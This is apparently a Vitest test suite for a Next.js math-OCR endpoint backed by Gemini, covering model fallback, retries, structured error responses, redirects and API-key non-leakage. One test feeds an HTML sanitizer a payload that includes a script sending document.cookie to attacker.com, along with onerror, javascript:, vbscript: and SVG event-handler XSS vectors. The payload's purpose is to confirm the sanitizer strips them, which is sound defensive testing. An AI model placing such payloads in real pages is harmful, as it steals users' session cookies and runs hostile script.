import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { NextRequest } from "next/server";
import {
  getCandidateModels,
  isTransientProviderError,
  POST as postMathOcr,
} from "../src/app/api/math-ocr/route";
import { sanitizeJoditHtml } from "../src/lib/math-ocr-utils";
import nextConfig from "../next.config";
import { metadata as plpMetadata } from "../src/app/plp-math-content/layout";

// Mock GoogleGenerativeAI
const mockGenerateContent = vi.fn();
const mockGetGenerativeModel = vi.fn().mockImplementation(({ model }: { model: string }) => ({
  modelName: model,
  generateContent: (...args: unknown[]) => mockGenerateContent(...args),
}));

vi.mock("@google/generative-ai", () => {
  return {
    GoogleGenerativeAI: class {
      apiKey: string;
      constructor(apiKey: string) {
        this.apiKey = apiKey;
      }
      getGenerativeModel(args: { model: string; generationConfig?: unknown }) {
        return mockGetGenerativeModel(args);
      }
    },
  };
});

describe("Math OCR Resilient Provider, Fallback & Security Suite", () => {
  const originalEnv = { ...process.env };

  beforeEach(() => {
    mockGenerateContent.mockReset();
    mockGetGenerativeModel.mockClear();
    process.env = { ...originalEnv };
    process.env.GEMINI_API_KEY = "test-secret-gemini-key-12345";
  });

  afterEach(() => {
    process.env = { ...originalEnv };
  });

  // 1. Configurable Gemini model list through GEMINI_MODEL_PRIORITY env var
  it("1. Configurable model priority via GEMINI_MODEL_PRIORITY environment variable", () => {
    delete process.env.GEMINI_MODEL_PRIORITY;
    const defaultModels = getCandidateModels();
    expect(defaultModels).toContain("gemini-3.5-flash");
    expect(defaultModels[0]).toBe("gemini-flash-lite-latest");

    process.env.GEMINI_MODEL_PRIORITY = "gemini-custom-1, gemini-custom-2, gemini-custom-3";
    const customModels = getCandidateModels();
    expect(customModels).toEqual(["gemini-custom-1", "gemini-custom-2", "gemini-custom-3"]);
  });

  // 2. Successful raw-text OCR with mocked Gemini response
  it("2. Successful raw-text OCR with mocked Gemini response", async () => {
    const mockOutput = {
      transcription: "x^2 + 5x + 6 = 0",
      detectedType: "Quadratic Equation",
      rawDescription: "Quadratic Equation",
      latex: "x^2 + 5x + 6 = 0",
      joditHtml: "<div style=\"font-size: 24px;\">x² + 5x + 6 = 0</div>",
      mathml: "<math xmlns=\"http://www.w3.org/1998/Math/MathML\"><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>5</mn><mi>x</mi><mo>+</mo><mn>6</mn><mo>=</mo><mn>0</mn></mrow></math>",
      confidence: 1.0,
      uncertainParts: [],
    };

    mockGenerateContent.mockResolvedValueOnce({
      response: {
        text: () => JSON.stringify(mockOutput),
      },
    });

    const fd = new FormData();
    fd.append("rawText", "x^2 + 5x + 6 = 0");

    const req = new NextRequest("http://localhost:3000/api/math-ocr", {
      method: "POST",
      body: fd,
    });

    const res = await postMathOcr(req);
    expect(res.status).toBe(200);
    const json = await res.json();
    expect(json.latex).toBe("x^2 + 5x + 6 = 0");
    expect(json.detectedType).toBe("Quadratic Equation");
  });

  // 3. Model 503 fallback to the next model
  it("3. Model 503 fallback to the next model in priority order", async () => {
    process.env.GEMINI_MODEL_PRIORITY = "model-a,model-b";

    // model-a fails on initial and retry with 503
    mockGenerateContent
      .mockRejectedValueOnce(new Error("[503 Service Unavailable] High demand on model-a"))
      .mockRejectedValueOnce(new Error("[503 Service Unavailable] High demand on model-a"))
      // model-b succeeds
      .mockResolvedValueOnce({
        response: {
          text: () =>
            JSON.stringify({
              transcription: "x = 2",
              detectedType: "Linear Equation",
              rawDescription: "x = 2",
              latex: "x = 2",
              joditHtml: "<div style=\"font-size: 24px;\">x = 2</div>",
              mathml: "<math xmlns=\"http://www.w3.org/1998/Math/MathML\"><mrow><mi>x</mi><mo>=</mo><mn>2</mn></mrow></math>",
            }),
        },
      });

    const fd = new FormData();
    fd.append("rawText", "x = 2");

    const req = new NextRequest("http://localhost:3000/api/math-ocr", {
      method: "POST",
      body: fd,
    });

    const res = await postMathOcr(req);
    expect(res.status).toBe(200);
    const json = await res.json();
    expect(json.latex).toBe("x = 2");

    // Expect model-a was tried twice (initial + 1 retry), then model-b succeeded
    expect(mockGetGenerativeModel).toHaveBeenCalledWith(
      expect.objectContaining({ model: "model-a" })
    );
    expect(mockGetGenerativeModel).toHaveBeenCalledWith(
      expect.objectContaining({ model: "model-b" })
    );
  });

  // 4. 429 retry and bounded retry count (maximum 1 retry per model)
  it("4. 429 retry and bounded retry count (max 1 retry per model)", async () => {
    process.env.GEMINI_MODEL_PRIORITY = "model-only-one";

    // First attempt fails with 429, retry succeeds
    mockGenerateContent
      .mockRejectedValueOnce(new Error("[429 Too Many Requests] Rate limit reached"))
      .mockResolvedValueOnce({
        response: {
          text: () =>
            JSON.stringify({
              transcription: "y = 4",
              detectedType: "Linear",
              rawDescription: "y = 4",
              latex: "y = 4",
              joditHtml: "<div>y = 4</div>",
              mathml: "<math xmlns=\"http://www.w3.org/1998/Math/MathML\"><mi>y</mi><mo>=</mo><mn>4</mn></math>",
            }),
        },
      });

    const fd = new FormData();
    fd.append("rawText", "y = 4");

    const req = new NextRequest("http://localhost:3000/api/math-ocr", {
      method: "POST",
      body: fd,
    });

    const res = await postMathOcr(req);
    expect(res.status).toBe(200);
    expect(mockGenerateContent).toHaveBeenCalledTimes(2); // Initial try + 1 retry
  });

  // 5. All models unavailable -> structured 503 response
  it("5. All models unavailable returns structured 503 error contract", async () => {
    process.env.GEMINI_MODEL_PRIORITY = "model-a,model-b";

    mockGenerateContent.mockRejectedValue(
      new Error("[503 Service Unavailable] Model experiencing high demand")
    );

    const fd = new FormData();
    fd.append("rawText", "a^2 + b^2 = c^2");

    const req = new NextRequest("http://localhost:3000/api/math-ocr", {
      method: "POST",
      body: fd,
    });

    const res = await postMathOcr(req);
    expect(res.status).toBe(503);
    const json = await res.json();

    expect(json.ok).toBe(false);
    expect(json.code).toBe("MODEL_UNAVAILABLE");
    expect(json.retryable).toBe(true);
    expect(typeof json.requestId).toBe("string");
    expect(json.requestId).toMatch(/^req_/);
    expect(json.message).toContain("temporarily busy");
    // Ensure no raw Google error message or URLs leaked to client
    expect(JSON.stringify(json)).not.toContain("https://generativelanguage.googleapis.com");
    expect(JSON.stringify(json)).not.toContain(process.env.GEMINI_API_KEY!);
  });

  // 6. Timeout -> structured 504 response
  it("6. Timeout returns structured 504 error contract", async () => {
    process.env.GEMINI_MODEL_PRIORITY = "model-slow";

    // Simulate timeout error
    mockGenerateContent.mockRejectedValue(
      new Error("Model model-slow timed out after 10000ms")
    );

    // Mock Date.now to simulate overall budget exhausted
    const nowReal = Date.now();
    let callCount = 0;
    const dateSpy = vi.spyOn(Date, "now").mockImplementation(() => {
      callCount++;
      return nowReal + (callCount > 1 ? 40000 : 0);
    });

    const fd = new FormData();
    fd.append("rawText", "int x dx");

    const req = new NextRequest("http://localhost:3000/api/math-ocr", {
      method: "POST",
      body: fd,
    });

    const res = await postMathOcr(req);
    dateSpy.mockRestore();

    expect(res.status).toBe(504);
    const json = await res.json();
    expect(json.ok).toBe(false);
    expect(json.code).toBe("UPSTREAM_TIMEOUT");
    expect(json.retryable).toBe(true);
    expect(json.message).toContain("timed out");
    expect(typeof json.requestId).toBe("string");
  });

  // 7. Transient error detector classification
  it("7. isTransientProviderError correctly identifies transient vs fatal errors", () => {
    expect(isTransientProviderError(new Error("[503 Service Unavailable] high demand"))).toBe(true);
    expect(isTransientProviderError(new Error("[429] Resource has been exhausted"))).toBe(true);
    expect(isTransientProviderError(new Error("fetch failed: socket hang up"))).toBe(true);
    expect(isTransientProviderError(new Error("Model timed out after 10000ms"))).toBe(true);
    expect(isTransientProviderError(new Error("[500 Internal Server Error]"))).toBe(true);

    // Fatal / non-transient errors should NOT be retried or fallen back
    expect(isTransientProviderError(new Error("API_KEY_INVALID"))).toBe(false);
    expect(isTransientProviderError(new Error("Invalid value for prompt"))).toBe(false);
    expect(isTransientProviderError(null)).toBe(false);
  });

  // 8. /math-ocr returns 308 to /plp-math-content in next.config.ts
  it("8. /math-ocr permanent 308 redirect to /plp-math-content is defined", async () => {
    const redirects = await nextConfig.redirects!();
    const entry = redirects.find((r) => r.source === "/math-ocr");
    expect(entry).toBeDefined();
    expect(entry?.destination).toBe("/plp-math-content");
    expect(entry?.permanent).toBe(true); // HTTP 308
  });

  // 9. Canonical metadata uses /plp-math-content
  it("9. Canonical and OpenGraph metadata use clean /plp-math-content URL", () => {
    expect(plpMetadata.alternates?.canonical).toBe(
      "https://ai-toolkit-hub-nu.vercel.app/plp-math-content"
    );
    expect((plpMetadata.openGraph as Record<string, unknown>)?.url).toBe(
      "https://ai-toolkit-hub-nu.vercel.app/plp-math-content"
    );
  });

  // 10. Generated HTML and SVG sanitization against adversarial payloads
  it("10. sanitizeJoditHtml thoroughly strips adversarial scripts, SVG exploits, and active protocols", () => {
    const maliciousPayload = `
      <div style="font-size: 24px;">
        <p>Normal equation: x = 1</p>
        <script>window.location='http://attacker.com?leak='+document.cookie</script>
        <img src="valid.png" onerror="alert('xss')" />
        <a href="javascript:alert(1)">Click me</a>
        <a href="vbscript:msgbox(1)">Click me vb</a>
        <svg xmlns="http://www.w3.org/2000/svg">
          <foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject>
          <animate onbegin="alert(2)" attributeName="x" dur="1s" />
          <set onend="alert(3)" />
          <use xlink:href="javascript:alert(4)" />
          <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
        </svg>
      </div>
    `;

    const sanitized = sanitizeJoditHtml(maliciousPayload);

    expect(sanitized).toContain("x = 1");
    expect(sanitized).toContain("<circle");
    expect(sanitized).not.toContain("<script>");
    expect(sanitized).not.toContain("window.location");
    expect(sanitized).not.toContain("onerror");
    expect(sanitized).not.toContain("javascript:");
    expect(sanitized).not.toContain("vbscript:");
    expect(sanitized).not.toContain("<foreignObject");
    expect(sanitized).not.toContain("<iframe");
    expect(sanitized).not.toContain("<animate");
    expect(sanitized).not.toContain("<set");
    expect(sanitized).not.toContain("<use");
    expect(sanitized).not.toContain("onbegin");
    expect(sanitized).not.toContain("onend");
  });

  // 11. No API secret appears in response body or client bundle
  it("11. Never leaks GEMINI_API_KEY in error response body", async () => {
    process.env.GEMINI_MODEL_PRIORITY = "model-x";
    mockGenerateContent.mockRejectedValue(
      new Error(`[500 Internal Error] Failed with key=${process.env.GEMINI_API_KEY}`)
    );

    const fd = new FormData();
    fd.append("rawText", "2 + 2 = 4");

    const req = new NextRequest("http://localhost:3000/api/math-ocr", {
      method: "POST",
      body: fd,
    });

    const res = await postMathOcr(req);
    const bodyText = await res.text();

    expect(bodyText).not.toContain("test-secret-gemini-key-12345");
  });

  // 12. UI spinner always stops after error (finally block lifecycle test)
  it("12. UI loading state resets to false in finally block on success, error, or abort", async () => {
    let isLoading = true;
    const simulateUiLifecycle = async (shouldFail: boolean) => {
      isLoading = true;
      try {
        if (shouldFail) {
          throw new Error("503 Service Unavailable");
        }
      } catch {
        // error handling
      } finally {
        isLoading = false;
      }
    };

    await simulateUiLifecycle(true);
    expect(isLoading).toBe(false);

    await simulateUiLifecycle(false);
    expect(isLoading).toBe(false);
  });

  // 13. Retry does not duplicate concurrent requests
  it("13. Retry does not dispatch duplicate concurrent network requests while active", async () => {
    let activeRequestCount = 0;
    let dispatchCount = 0;

    const mockSubmitData = async () => {
      if (activeRequestCount > 0) {
        return; // Guard prevents concurrent duplicate requests
      }
      activeRequestCount++;
      dispatchCount++;
      try {
        await new Promise((r) => setTimeout(r, 10));
      } finally {
        activeRequestCount--;
      }
    };

    // Attempt concurrent invocations
    await Promise.all([mockSubmitData(), mockSubmitData(), mockSubmitData()]);
    expect(dispatchCount).toBe(1);
  });
});

